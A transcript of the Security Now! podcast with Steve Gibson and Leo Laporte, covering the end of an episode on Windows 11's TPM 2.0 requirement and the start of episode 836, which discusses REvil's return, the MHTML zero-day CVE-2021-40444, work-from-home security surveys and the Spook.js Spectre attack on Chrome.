And now, as I put all this together, what I finally realized was the following:  Everything I've just enumerated all refers to the way everything is today under Windows 10.  Nothing changes under Windows 11.  In other words, there is not a single new feature being brought to Windows by Windows 11 that creates any additional need or reason for 2.0.  When Mary Jo asked Paul what was new in Windows 11 aside from the centered Start Menu and the rounded corners, she was really asking.  There are no new features in Windows 11 that require anything more of the TPM than Windows 10 already does.  Yet Windows 11 is refusing to run on the same TPMs as Windows 10, apparently because someone at Microsoft thought it would be cool to enact a more restrictive change in requirements.



Given these realities, the path Microsoft, I think, should take for Windows 11 is clear.  Simply use the maximum security that's being offered by whatever, if any, TPM is present in a system.  If the platform offers TPM 2.0, great.  Use the 256-bit enhanced security that's available there.  If not, settle for the 160-bit security offered by SHA-1 and TPM 1.2's HMAC, just as Windows 10 does now.  If a platform doesn't offer TPM 2.0, then its user cannot take advantage of those four enterprise-oriented features from among the 14, among the balance of 10, that will run on any TPM.



So, fine.  Explain to those enterprise users that if they want those four features, they'll need to upgrade their hardware.  But don't tell random home or small business users who couldn't care less about Windows Defender System Guard and Autopilot that they're SOL if they wish to upgrade to the new Windows, just because it's possible to do so, to be mean.  That's how it's going to be seen.  It's going to be seen as capricious and arbitrary because, as we've just seen, it is.



It's my sincere hope that this decision within Microsoft is being given a broader airing, and that it's a requirement that they might reconsider.  We just saw Apple reconsider on the CSAM deal when people said, whoa, wait a minute.  Given a careful analysis of the two TPM feature sets, and of Windows' current use of them, there doesn't appear to be any compelling need to force a move to TPM 2.0 "just because."  Oh, and after I wrote this, I just found out this morning, Windows 11 Dark Mode will have more smoothing sounds.



LEO:  Soothing sounds or smoothing sounds?



STEVE:  Soothing.  They're going to be more soothing, Leo.



LEO:  Oh. 



STEVE:  When you switch to dark mode, you will be further soothed.



LEO:  Well, that's a relief.



STEVE:  Maybe you will be soothed by Microsoft changing their policy because this is nuts.  I mean, again, maybe they're saying we want more security.  Maybe they're saying we have plans in the future.  Okay, fine.  So tell people if they want to use these new things they need to upgrade their hardware.  But don't prevent them from having what, I mean, everybody's going to want 11, only because everybody always wants the latest and greatest.  Well, of course that wasn't really true for Windows 10.  But Microsoft is going to be pushing it.  So let people have it.  There is no reason not to.  Windows 10 is going to continue to run for the rest of its life.  It's crazy.



LEO:  I'm glad their sounds are more soothing, though.



STEVE:  Won't that be nice, yes.  You will switch to Dark Mode on Windows 11 for more smoothing sounds.



LEO:  So we really - this really flattens it.



STEVE:  It does.



LEO:  There's nothing in the 8th-generation Intel processors that makes them more secure.



STEVE:  No.



LEO:  And there's nothing in TPM 2.0 that is necessary for Windows 11, at least its current...



STEVE:  There's nothing that 11 is using.



LEO:  Right.



STEVE:  There's nothing it's using.



LEO:  I could see if, oh, you need it for BitLocker, but...



STEVE:  We already have it.



LEO:  We already have it.



STEVE:  BitLocker runs on TPM 1.2, yup.



LEO:  So it's to sell new computers, which is what we always thought it was, to be honest.  In fact, this confirms it.  Good analysis.



STEVE:  It's not going to go down well, my friend.



LEO:  Yeah.  Yeah.  They just want you to buy a new computer.  It's good for the industry.  Steve Gibson's good for the industry.  I can tell you that right now.  We thank you so much for listening to Security Now!.  If you want a copy of this show, you can get it of course from us, but Steve's got copies.  In fact, he's got some unique versions of this show on his website.  He's got the 16Kb audio for people who want the smallest possible audio file.  Even smaller, the human-written transcripts, which you can read along as you listen, you can use for search.  It's a really nice feature.  All of that is at GRC.com, the Gibson Research Corporation.



While you're there, pick up a copy of the world's best mass storage maintenance and recovery utility, SpinRite.  Current version 6.0; 6.1 is in process.  You'll get a free upgrade, plus you get to participate in the development of 6.1.  There's also a lot of other great free stuff at GRC.com.  You can leave him questions there at GRC.com/feedback.  But his DMs are open on Twitter.  That might be the better way to do it.  He is @SGgrc.  Actually, he also has some great forums, where there's always good conversation going on at GRC.com.



We have 64Kb audio and video versions of the file at our site, TWiT.tv/sn, so you can download it.  You can actually watch us do it live.  If you're really in a hurry, you want to get it sooner than anybody else on the planet, tune in every Tuesday right after MacBreak Weekly.  That's usually around 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  Live audio and video streams at TWiT.tv/live.  If you're watching live, chat with us live.  There's two places to do that.  Everybody can chat at irc.twit.tv.



Let's see, what else?  Oh, you know what, if you want the easiest way to get this show, just find a podcast application and subscribe.  You'll get it the minute it's available for download.  That's probably the easiest.  I do invite you, if you subscribe, and your podcast player has reviews, it'd be nice if you left a five-star review for Steve.  That'd make everybody feel extra special.  Plus it helps spread the word, and we appreciate that.



All right, Steve.  Next Tuesday I don't think we'll be delayed.  We might be.  Remember the Apple event is at 10:00 a.m., followed by MacBreak Weekly at 11:00.  I think Apple's going to be dead on time, which means we'll probably be on time to Security Now!.  But just we might be pushed back a little bit, just a word of... 



STEVE:  Is this going to be new phones?



LEO:  New phones are here.  We think.



STEVE:  Cool.



LEO:  And a new watch.



STEVE:  Cool.



LEO:  But we won't know till Apple...



STEVE:  And by the way, I did love that Google spoof of...



LEO:  Wasn't that great?



STEVE:  The circle, oh.  I grabbed it, and I played it for Lorrie.  She just loved it.



LEO:  She got it?



STEVE:  With the whispering voice.  Oh, yeah.  With the whispering voice.  It's an earplug.



LEO:  This is in their ad for the new Google Phone, the 5a with 5G, because it has a headphone jack.  So they do the Jony Ive-style parody.



STEVE:  Ah.



LEO:  Which if you could find it is well worth it.



STEVE:  It's really wonderful.  I found it on YouTube, so I'm sure it's - yeah.  Okay, my friend.



LEO:  Thank you, Steve.  Have a great week, and we'll see you next time on Security Now!.



STEVE:  Thanks, buddy.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#836

DATE:		September 14, 2021

TITLE:		The Meris Botnet 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-836.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we're going to note the apparent return of REvil, not nearly as dead and gone as many hoped.  We're going to look at a new and quite worrisome zero-day exploitation of an old Windows IE MHTML component.  Even though IE is gone, its guts live on in Windows.  We're going to share the not surprising, but still interesting, results of security impact surveys taken of IT and home workers, after which we'll examine a fully practical JavaScript-based Spectre attack on Chrome.  I have a bit of closing-the-loop feedback to share, and a surprisingly serious question about the true nature of reality for us to consider.  Then we'll finish out today's podcast by looking at the evolution of Internet DoS attacks through the years, which recently culminated in the largest ever seen, most problematic to block and contain, RPS DDoS attack where RPS stands for Requests Per Second.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  ActiveX is back.  And it's a zero-day for everyone. Congratulations.  We'll talk about REvil the ransomware gang is back.  And then it's the biggest DDoS attack in history.  The details of the Meris botnet and why we all should be afraid.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 836, recorded Tuesday, September 14th, 2021:  The Meris Botnet.



It's time for Security Now!, the show where we cover your security, your privacy, your safety online with this guy right here, Security Now! maven Steve Gibson.  Hello, Steve.



STEVE GIBSON:  Leo, it's great to be with you again for this big Apple news day.



LEO:  Oh, yeah.  Sorry we're a little late because of that, yeah.	



STEVE:  The iPhone 13.  And I think I'll just stay with my 12.  Seems fine.  



LEO:  Yeah, yeah.



STEVE:  It works.  And the pads, I've got so many.  I have, like, every pad they ever made from the beginning.  So I was giving them away for a while.  But now I've got, you know, pads I like.



LEO:  And, you know, what's absolutely the case is there's not that much difference in these new models of any of this.



STEVE:  Well, yes.  You guys were talking about that.  And I was thinking as I was hearing that, that this is the evidence of a mature industry; right?



LEO:  Exactly.



STEVE:  It's like, we're not having, oh my god, breathtaking breakthroughs now.  Now it's like, oh, look, you know, my bandwidth went up by 5%.  It's like, okay, but it didn't go up by 1,000% kind of thing.



LEO:  Right.  When's the last time you felt the need to get a new toaster?



STEVE:  And they were talking about 5G.  It's like, wait, don't I already have that?  Yeah, I do.  So, yeah.  Although, Leo, Leo.



LEO:  Yes, yes.  Steve.  Steve, Steve, what?  Yes.



STEVE:  When I realized that their whatever that was, camera technology, like when the guy turns away from the camera to look behind him, and it focuses on what's back there, it's like, oh, you're kidding me.  And then he turns back to look at the camera, and it puts the focus back on him.  It's like, okay.  That's, you know, Apple schmaltz.



LEO:  No, no, no, that's so funny.  It's such a...



STEVE:  Anyway, what were you going to say when I so...



LEO:  Oh, just that you haven't yet tweeted your show notes.  So I just wanted to mention that.



STEVE:  Oh, I forgot that.



LEO:  But that's all right.



STEVE:  I'll do it.



LEO:  But you put it online and everything.



STEVE:  Oh, that's right.  But you need that.



LEO:  Oh, no, I have them.  I have them.  I get them.  There's an email, as well, so I have them.



STEVE:  Oh, that's right, okay.



LEO:  And including your Picture of the Week, yes.  Which I love.



STEVE:  Okay.  I forgot, we've already started.



LEO:  Yes, the show's begun.



STEVE:  Hello, everybody.



LEO:  Yes.



STEVE:  This is Security Now!.



LEO:  The reason I want you to get going is because I have a fresh doughnut from Chicago's Stan's Donuts, and it's crying my name out loud.  And I can't bite into this until you...



STEVE:  Yes.  And remember to mute your microphone because it's wrapped in paper.



LEO:  Yes, I shall.



STEVE:  And we'll be hearing you crinkling the paper.



LEO:  Oh, that won't be all you'll hear.  You'll hear [appreciative mumbling].



STEVE:  So I don't speak Latvian, or I would first of all have known how to help John put a flat bar over the "e," which is in the show notes, and it's everywhere, just because I was cutting and pasting, and it came with it, happily.  But I don't know how to pronounce it.  So maybe it's the Meris Botnet?  Meris?  Meris?  I don't know.  Anyway, it's Latvian for "plague."



LEO:  Oh.



STEVE:  Yeah.  And the topic is this botnet because it represents sort of essentially a steady evolution over time.  We've now gotten to the point where we have distributed denial of service attacks which are incredibly difficult to block.  And not only because of the nature of the attack, which rather than just like packet-level attacks, like down at Layer 3 and Layer 4, these are Layer 7 attacks.  They're application layer attacks.  But because we've, you know, it's in this back-and-forth, cat-and-mouse game of attack and block and new attack and new block and so forth, all that's done is escalate this.



Anyway, we're going to go back and quickly look at the evolution of attacks, remind what Layer 3 and 4 and 7 are about, and then look at this one in detail, which is being launched by this Meris botnet.  But first we're going to note the apparent return of REvil, not nearly as dead and gone as many had hoped.



LEO:  Yeah, I saw that.  I thought that was interesting.



STEVE:  Yeah.  Well, and it reminded me that we shouldn't ascribe any motivations that we don't actually know about to any of these culprits out there.  I mean, when they disappeared shortly after the Kaseya attacks, people were like, oh, Putin must have stomped on them or something.



LEO:  Right, right, right, right.  And then we thought another botnet or ransomware gang was them.



STEVE:  Was renamed, exactly.



LEO:  Maybe it was, but...



STEVE:  Apparently, yeah, who knows.



LEO:  Who knows, is right.



STEVE:  Anyway, we're then going to take a look at - exactly, who knows.  We're going to take a look at a new and quite worrisome zero-day exploitation of an old Windows IE MHTML component.  Even though IE is gone, its guts live on in Windows.  We're going to share the not-surprising but still interesting results of a pair of security impact surveys, one taken of IT professionals who are trying to do the securing, the other taken of home workers who are trying to get around it.  So that had some interesting little tidbits and stats that came out of it.



After that we're going to examine a fully practical JavaScript-based Spectre attack on Chrome.  It's not just theoretical anymore.  Then I have a bit of closing-the-loop feedback to share, and a surprisingly serious question about the true nature of reality for us all to consider.



LEO:  Ooh.



STEVE:  It might be possible for you to eat doughnuts with no consequences, Leo.



LEO:  That I'm interested in.



STEVE:  I thought that might - yeah.



LEO:  Now you've got me.



STEVE:  And we will then finish out the podcast by looking back at where we've come from the beginning of DDoS and where this has landed us, after we of course deal with our Picture of the Week.  Okay.  So I added this caption to this photo of a coffee mug that I thought was a kick.  The caption reads:  "What do you mean, you've been unable to create an account there?  What's the problem?"



LEO:  And here's the answer.



STEVE:  And here's the answer.  The coffee mug reads:  "Sorry, but your password must contain at least 8 characters, upper and lower case letter, a symbol or a number, a hieroglyph, a haiku, a musical note, the feather of a hawk, and a drop of unicorn blood."  Otherwise...



LEO:  To which we're going to add "and the letter 'e' with a line across the top."



STEVE:  Yes.



LEO:  And if it's not there, forget it.  You can't get in.



STEVE:  So, okay.  Microsoft is warning of a newly discovered IE, believe it or not, sort of indirectly IE, zero-day being actively exploited, currently in targeted attacks using their Office apps.  While the danger might not be extreme, especially if the use of this exploit remains targeted, this should remind us of our Picture of the Week two weeks ago, which was titled "Pandora's Inbox," where Pandora's depicted thinking to herself, it can't hurt to open one little attachment; can it?



And while I agree that it's unlikely to hurt any of us, we do know that once a zero-day has been observed being used, and it's become public, those highly targeted attacks likely become spray attacks.  You know, the secret is out, and a patch will be forthcoming.  Which means that the optimal strategy at that point, for those who wish to exploit what has now become a time-limited advantage, is to go from targeting individual people to spraying this thing far and wide to collect all of the curious and even the incurious Pandoras which may be possible.  So my word to our listeners, don't be a Pandora.



When we hear that it's an IE zero-day, that's really a misnomer because the vulnerability, which is now being tracked as CVE-2021-40444, was found in Microsoft's MHTML component, that was also known as Trident, which is the IE browser engine.  And while IE itself is no longer showing up, like when you click on a URL you get Edge, but that component remains in active use by Office documents, which use it to render any web-hosted content which has been embedded into Word, Excel, or PowerPoint.



So Microsoft has said that they're aware of targeted attacks exploiting this vulnerability, and that, quote, this is them:  "An attacker could craft" - which means, you know, is crafting, attackers are crafting - "malicious ActiveX controls to be used by a Microsoft Office document that hosts the browser rendering engine."  They explained that the attacks and the underlying zero-day were discovered by security researchers from Mandiant and EXPMON.  I've never run across them before, E-X-P-M-O-N, all caps.  And last Tuesday this EXPMON gang who maybe ought to come up with something pronounceable, tweeted:  "EXPMON system detected a highly sophisticated zero-day attack in the wild."  And apparently now we have a new acronym or abbreviation, rather sorry, abbreviation.  Every time I say "acronym" by mistake, I get corrected by the loving folks on Twitter who say, you know, Steve, it's only an acronym if you can pronounce it.  It's like, oh.



So this is "in the wild" - ITW is our new abbreviation - "targeting Microsoft Office users."  They tweeted:  "At this moment, since there's no patch, we strongly recommend that Office users be extremely cautious about Office files.  Do not open if not fully trust the source."  And I thought for a moment that Obi-Wan had given Luke bad advice, but I remembered that was "Trust the Force," so that's different.  You don't have to worry about that.  And yes, I did have a lot of coffee while I was waiting for the podcast to start.



LEO:  I love it.  Trust the source, Luke.



STEVE:  Trust the source, Luke.  Yes.



LEO:  Love it.



STEVE:  And since Microsoft's disclosure, the hacking community, this is what's really interesting, just has exploded over this thing over the past week.  I think the disclosure was last Tuesday.  A couple days later there was proof of concepts.  There was stuff on GitHub.  I mean, they just went into overdrive.  Posts, guides, demo code, working proofs of concept, and everything anyone could need to design and launch their own attacks.



LEO:  Oh, Jesus.



STEVE:  In fact, the guys at BleepingComputer used the available stuff to duplicate the attacks themselves.  It's like, yes, it all works.  All freely available since late last week.  Even GitHub has been hosting complete exploit documentation.



Now, the good news is Windows Defender's knowledge base has been updated immediately to recognize known instances of the attacks.  And it's worth noting that, even though patches tend to be slow sometimes to come out - and this is Patch Tuesday, here we are on the 14th, which as I mentioned last week makes it the latest Patch Tuesday that can occur.



And I don't know if something that Microsoft just announced last week on Tuesday, if it's going to make it into today's patches.  We'll have to wait to see if that's happening today.  But the good news is we are seeing that Windows Defender updates, which are occurring daily, if not more so, are being good about catching these things and blocking them if you're using Windows Defender.  It's less clear what third parties are able to do, if they are able to get the advanced knowledge that they would need from Apple in order to be able to offer that.  Anyway, some protection is presently available to everyone using one of the multiple forms of Defender, so that's good.



There are, as I said, guides to implementing, well, there are guides to doing it.  There are also - there's a bunch of mitigation advice.  But that's been a moving target because, as I said, this has been highly active the past week.  Attackers keep finding ways around mitigations as they are suggested.  So hopefully this thing gets fixed.  I would just suggest that, I mean, it's annoying to not be able to open attachments.  But again, two weeks ago, Pandora's Inbox.  You don't want that to be your inbox.



So just be aware that this thing may have exploded from targeted-by-a-sniper sort of attacks to shotgun, just spray everywhere and get who you can.  With any luck this thing's been fixed, and you'll get patched today, and this won't be a problem.  But it is bad.



LEO:  Why is ActiveX still alive?



STEVE:  I know.  I know.



LEO:  It's still in Windows?



STEVE:  Well, it's because documents live on, and you wouldn't want that document not to be able to open a website now, would you?



LEO:  Yeah.



STEVE:  Because, you know, you've got to have that in your PowerPoint. 



LEO:  I remember you specifically talking about what a threat it was to allow something downloaded from the web to run locally on your computer as an app.



STEVE:  Well, because - and it's bringing in JavaScript.  What could possibly go wrong?  So not only is your document scripting in order to bring in, in order to host a container which is then a web browser in your document, which has been given a URL to a foreign server, which can then load something in with JavaScript running and, like, do something.  It's like...



LEO:  There should be a way to just remove ActiveX.  I'm stunned that it's still alive in there.  That's crazy.  That's an Internet Explorer component?



STEVE:  Yeah, yeah.  Well, ActiveX is what COM evolved into.



LEO:  Right.



STEVE:  So there was the Component Object Model (COM).  And then they got so tired of doing extensions of it because they kept figuring out it could do more, that they said, okay, let's just kind of start over.  So we'll call it - oh, and it was also a renaming.  I remember that it sort of like - they didn't feel like it was exciting enough. 



LEO:  It's active.



STEVE:  ActiveX, yes.



LEO:  But before COM was OLE; right?  Which that's pretty good.  OLE sounds like a bullfighter.



STEVE:  Right, like OLE.  That was good, yeah.



LEO:  It's still supported through Internet Explorer 11, even though it's been deprecated for years.



STEVE:  Right.  And so this is invoking IE, an old IE control, through ActiveX in order to bring it back alive.  So, yeah.  And, I mean, notice we're not even talking about the fact that IE's MHTML control has a problem, because of course it does.  Why would we imagine that a browser component would not have a horrible, easily exploitable flaw.  Instead we're just talking about, oh, this is the way you invoke it because, yeah, embedded in Office documents.



Okay.  So we also have - this seems to be abbreviation day.  I also ran across WFH, which is the new abbreviation for Work From Home.  That's now a thing.  You WFH.  You're WFHing.  Anyway, last Thursday HP's Wolf Security Group published a new study which they titled "Security Rebellions & Rejections Report."  Not very optimistic.  It's a compilation of data from an online YouGov survey aimed at office workers who adopted Work From Home and global research conducted with IT decision-makers.



So as I said, on one hand we've got the IT guys on the front lines, trying to not have those lines move.  And now all of this traditional in-office workforce which thanks to the pandemic has been shuttled to home, who don't really understand why things are more difficult to do from the comfort of their couch, as opposed to the inherent containment that you get when you have to go into the office, maybe even wear a tag around your neck to show that you belong there, and then can sit down in front of your desktop at the office.  Like why is my kid's Chromebook at home any less secure than my IT-enforced machine on the desktop?



Okay.  So in total, 91% of the IT people surveyed said they have felt pressured to compromise on security due to the need for business continuity during the COVID-19 pandemic.  So a little over nine out of 10, right, 91%.  76% of those respondents said that security had taken a backseat, with 83% believing that working from home has created what was described as a "ticking time bomb" for corporate security incidents.



I have a chart in the show notes which shows the relative level of threat IT teams feel as a result of their office working employees increasingly working from home.  This was Figure 3 from this report.  And so 84%, the number one most occurring concern is ransomware, that home employees would let bad guys in who would then be able to crawl up the VPN connection into the corporate network, and ransomware was the biggest problem at 84%.



In second place at 83, firmware attacks against laptops and PCs.  I thought that was interesting, just like because this is - I guess the IT folks, they're used to having the equipment in the physical plant and not spread out all over hell and gone, where they don't have any control over it.  So firmware attacks against laptops and PCs.  Now, that's interesting, too, because that does suggest, and I'm suspicious of this, but okay, that the whole Secure Boot thing that we talked about last week really is important; that you really want to know that the BIOS or UEFI firmware has not been altered in a way that would allow these PCs to no longer be booting 100% legitimate OS.



LEO:  Such a difficult attack, and requires usually on-prem attackers.  I'm surprised that's ranked so high.



STEVE:  Yeah, yeah.



LEO:  I really am.  I don't think that's as big a threat as they think it is.  Or maybe it is.



STEVE:  I don't think so.  Also at 83, same threat level, exploited vulnerabilities in unpatched devices.



LEO:  Well, yeah.  Duh.



STEVE:  How does that even fit on this chart, Leo?



LEO:  That's all of them.



STEVE:  Yeah.  My lord.



LEO:  You mean Windows?  Yeah.



STEVE:  So then we have at 82% - these guys really, I hope they've got some anti-stress meds they're taking because they're really worried about this stuff - 82% is data leakage, which is generic, but okay.  81%, I mean, these bars are just staying up there.  81% account/device takeover, man-in-the-middle attacks.



LEO:  They might as well just say, yeah, we're worried about everything, thank you.



STEVE:  You know, this probably was a multiple choice, like, survey.



LEO:  Yeah, that's what it was.



STEVE:  And they said yeah, and yeah, and yeah, and yeah, and yeah.



LEO:  Yeah, we're worried about it all, yeah.  Why wouldn't we? 



STEVE:  Yeah.  Who wasn't worried about data leakage?  I'm worried about anything that leaks.  So that's not good.  Especially as I get older.  Okay.  So IoT threats, that's 79%.  That's sort of a little more amorphous than I guess their own local PC stuff.  Targeted attacks, okay.  So I guess probably that flows from their own experience of dealing with a large employee cohort who are opening things they shouldn't.



LEO:  That's really what they should be worried about, I would say.



STEVE:  Yeah, yeah.  And then down at 76% are firmware attacks against printers.



LEO:  That's oddly specific.  Wonder what they're talking about?



STEVE:  They didn't say green printers or anything, just said printers.



LEO:  Printers, yeah, uh-huh.



STEVE:  Okay.  So, now, the view from the suddenly remoted office worker, it does substantiate the worries of those who are responsible for securing their experience.  Okay, specifically, according to the survey, young office workers in particular, you know, those pesky muskrats that don't really understand all the damage that can happen, they're more likely to circumvent existing security controls and safeguards in order to manage their workloads, with 48% of this younger cohort saying that security tools, such as all those pesky website restrictions or VPN requirements, half of them say they're a hindrance, with at least one third, 31% of them having at least attempted to bypass the restrictions.



Overall, 48% of office workers said that security measures waste time, and 54% in the 18- to 24-year-old bracket were more concerned with meeting deadlines than potential security breaches.  You know, I guess it's not their problem; right?  It's like, oh, well, you know, those pesky IT guys, they'll worry about that.  I've just got to get my work done.  And within that same group, 39% stated that they were unsure or unaware of their employer's security policies.  Yeah, I just, you know, I cash my check.  So it's like, okay.



Three other bullet points which the report highlighted were:  37% of office workers believe security policies are often too restrictive; 80% of IT teams experienced backlash from home users because of security policies; 83% of IT teams said the blurred lines between home and work life were making enforcement, and this was quoted in the survey, "impossible."  So I guess it wouldn't surprise us that this is generically the case.  But this really I think brings home just how much a problem was created by this rapid exodus from the office to everybody working at home.  Everyone likes it.  It's like, yay, this is great.  We can conduct meetings.  I can take my own dog out for a walk as necessary and so forth.  And a lot of people don't want to go back; right?  It's like, hey, this a good thing.



Joanna Burkey, HP's Chief Information Security Officer (CISO), she said: "CISOs are dealing with increasing volume, velocity, and severity of attacks.  Their teams are having to work around the clock to keep the business safe while facilitating mass digital transformation with reduced visibility."  She said:  "Cybersecurity teams should no longer be burdened with the weight of securing the business solely on their shoulders."  I don't know who she thinks is going to take it over.



She said:  "Cybersecurity is an end-to-end discipline in which everyone needs to engage."  Ah.  So she's trying to say that people who could care less need to care more.  Well, Joanna, good luck with that.  But tell that to someone who's having trouble authenticating to their remote employer's VPN and who has no appreciation for the dangers that are lurking out there.  It's just not going to happen.



LEO:  I'm actually surprised it wasn't more of an apocalypse, to be honest.



STEVE:  Yeah, that's a very good point.



LEO:  Yeah.  I mean, I guess it is an apocalypse.  But of course these people don't - they're completely vulnerable.



STEVE:  Well, and we're not talking about those ransomware attacks occurring 11 seconds; right?



LEO:  Right.



STEVE:  They're getting into corporate networks somehow.  And there has been a doubling of them in the past year.  So, gee, maybe there's a correlation between all these employees having moved home.  And so think about it, too, Leo.  This is a survey from IT people who seem to have a clue about security.  How many companies just said, oh, yeah, go to Fry's and get one of those VPN boxes and attach it to the network and let everyone connect?  The point being there's no doubt easily half of the small offices and enterprises that had to send people home didn't have, don't have the ability, really, to bring full-strength IT security to the challenge.  It just doesn't exist within a smaller group.



LEO:  Yeah.  I don't envy you guys.  I know it's hard.



STEVE:  Thank goodness I don't have a big crew.  I've got Sue and Greg, and they really - and even there, I will sometimes forward them some bits of these things just to keep them on their toes.



LEO:  Yes.



STEVE:  Just to say this problem didn't go away, guys.  So, yeah, knock on wood.  As I've said, I no longer leave drives mapped to GRC's inner sanctum because, careful as I am, it's not even really that much anymore about being careful.  It's like there's so much pressure to get in.



LEO:  Yeah.  A zero-day comes along, and you don't...



STEVE:  Right.



LEO:  Yeah.



STEVE:  Yeah, it's zero for a reason.



LEO:  Yeah, exactly.



STEVE:  So once again, quoting Bruce Schneier, attacks only ever get better.  As we know, the beginning of 2018 was dominated by the concept, which is all it really was then, of Spectre attacks.  Spectre, which was assigned CVEs 2017-5715 and 53, refers to a class of CPU performance optimizations which turned out to create previously unsuspected hardware-based vulnerabilities in many modern CPUs that break the isolation separating applications which allowed, theoretically, attackers to trick a program into accessing arbitrary locations associated with its memory space, thus abusing that program to read the contents of accessed memory, thereby potentially obtaining sensitive data.



Well, practical attacks are no longer theoretical.  Academic researchers at the University of Michigan, University of Adelaide, Georgia Institute of Technology, and Tel Aviv University have designed a Spectre-based side-channel attack which can be weaponized to successfully overcome the Site Isolation protections Google added to Chrome and to the Chromium browsers to leak sensitive data in Spectre-style speculative execution attacks.  They call it "Spook.js," "Spook" of course as in that original icon or the logo that Spectre had of being a ghost, so Spook.js.  And of course "js," as the name suggests, a JavaScript-based attack.



The researchers said:  "An attacker-controlled web page can know which other pages from the same websites a user is currently browsing, retrieve sensitive information from these pages, and even recover the user's username and password login credentials when they are autofilled."  They added that an attacker could retrieve data from Chrome extensions, as well.  Any data stored in the memory of a website being rendered, or a Chrome extension, can be extracted, including personally identifiable information displayed on the website, and auto-filled usernames, passwords, and credit card numbers.



Responding to this, Google said:  "These attacks use the speculative execution features of most CPUs to access parts of memory that should be off-limits to a piece of code, and then use timing attacks to discover the values stored in that memory.  Effectively, this means that untrustworthy code may be able to read any memory in its process's address space."



Chrome's Site Isolation rolled out in July of 2018, so like six months after we began talking about it in January, at the very start of 2018.  And it was fully enabled, has been fully enabled, that is Site Isolation, since Chrome 67.  Site Isolation, that group of technologies, were a series of software countermeasures designed to make these processor-based side-channel attacks more difficult to exploit.  And we talked about these things at the time, you know, things like reducing the resolution, that is, increasing the granularity of the timer that could be read by JavaScript so it would be less sure about how much time had passed.  When Site Isolation is enabled in Chrome 67 and beyond, each website will be loaded into its own process.  This would thwart attacks between OS isolated processes, and thus between sites.



But the researchers found scenarios where the site isolation safeguards do not separate websites and were able to get around the anti-Spectre protections.  Spook.js exploits this design quirk to result in information leakage from Chrome and Chromium-based browsers running on Intel, AMD, and Apple M1 processors.  So not just Intel.



Okay.  So I dug into this a bit, and upon closer inspection it turns out that what Google did was only isolating at the second-level domain.  So, for example, Chrome will separate 'example.com' from 'example.net' due to them having different top-level domains.  And Chrome will also separate 'example.com' from 'attacker.com because those have differing second-level domains.  But 'attacker.example.com' and 'corporate.example.com' are still allowed to share the same process.  And it's this lack of absolute process isolation by domain that allows pages hosted under 'attacker.example.com' the opportunity to extract information from pages under 'corporate.example.com.'



Now, that may not seem like a big problem, but remember that, for example, on GitHub it is subdomains are used, subdomains under GitHub.com are used to create accounts.  So, and this sort of thing happens many places.  So it is the case that there are pages in a subdomain which bad guys could control the loading of JavaScript into which would then, even with Site Isolation in place, allow them to peek into places they should not go that they share with the same third-level domain as places where there are secrets.



So this was a very useful discovery since they were able to demonstrate through practical JavaScript-based attacks that the existing countermeasures that were in place are insufficient to protect users from browser-based speculative execution attacks.  The Chrome Security Team's immediate response to this, and they received early access to the research last July, was to immediately extend Chrome's existing Site Isolation to ensure that browser extensions would no longer share a common process with each other.  Which was interesting.



It was previously the case that extensions were all lumped together in their own process.  They figured that was safe.  Turns out no.  You could get an extension that would launch speculative attacks against other extensions also being hosted by Chrome and which were sharing the same process memory.  That's no longer the case.  That Strict Extension Isolation is what got added.  And since Chrome 92, that's been enabled by default.  And the only downside is further proliferation of processes.



If anybody, by the way, has opened any modern browser and looked at what they are now doing in the Task Manager, there's like, there's a hundred Chrome.exes, you know, processes.  And same thing for Firefox.  It's like, oh, my goodness.  But that's the price we're paying for having pushed - we saw first that browsers were just unable to protect themselves.  And we talked about this not that long ago on the podcast, is that they basically turned over the responsibility to the operating system, leveraging the operating system's much more mature inter-process isolation.  And also the processor or the OS running on the hardware processor does have like a stronger ability to enforce inter-process isolation.



So moving forward it's unclear whether Google will take further action, that is, this third-level domain problem is a problem.  So they might feel that isolating at the second-level domain is sufficient.  I doubt that's the case.  The researchers explained that, as an immediate workaround:  "Web developers can separate untrusted, user-supplied JavaScript from all other content for their website, hosting all user-supplied JavaScript at a domain that has a different top-level domain," that is, arrange not to share any third-level domain, like somehow get yourself a second-level domain and put stuff there.  Like dot something else.  Dot, you know, there's an amazing number of dot things out there now.  I just saw, was it Alex who uses dot something?  I can't remember what it was.  I just saw it on MacBreak Weekly.



LEO:  You mean .dot?  Dot D-O-T?



STEVE:  No, it was like - it wasn't, oh, well, we know that there's .coffee.



LEO:  Oh, yeah, yeah, yeah.  You were thinking of Mikah Sargent's chihuahua.coffee, yeah.



STEVE:  Right, right, right.



LEO:  Oh, there's lots of them.



STEVE:  So you can get your own.



LEO:  Yeah, TLDs, yeah.



STEVE:  Yeah, exactly.  So you could get your own top-level domain in some other - or your own domain name in some other TLD.



LEO:  Exactly.  



STEVE:  And maybe split things up there.  And that way Chrome would isolate you.  But that's not your job.  That's the browser's job.  So I really do think that Chrome will end up probably stepping up.



LEO:  I'm looking at all the Firefox processes running on my Linux box.



STEVE:  Oh.



LEO:  One, two, three, four, five, six, seven, eight, nine, at least nine.



STEVE:  And how many tabs have you?



LEO:  Very few.



STEVE:  Exactly.



LEO:  I don't think it's the tabs at this point.  It's one tab.



STEVE:  No, no, no.  Yeah, well, no.  If you are like me and have a hundred tabs, then...



LEO:  Ooh, baby.  I have child ID one, two, three, four, five.  They're all child IDs.  So, wow, there's just - so is that sandboxing the tabs?  Is that what that is?



STEVE:  Exactly.  It's giving each tab their own process.



LEO:  It's own process, yeah.



STEVE:  And then Linux is doing the process isolation in order to keep the tabs from having any contact with each other.



LEO:  Right, right.  Which is great.



STEVE:  We hope.



LEO:  We hope.



STEVE:  So apparently vacation is over.  Emsisoft may have been the first to observe that REvil's "Happy Blog," as it's literally called, data-leaking site on the dark web had returned last week.  At that point, their ransomware negotiation site had not yet been brought back online.  But it has been now.  BleepingComputer arranged to get some Russian postings translated into English.  Remember that REvil's primary operator is known as "unknown," UNKN.



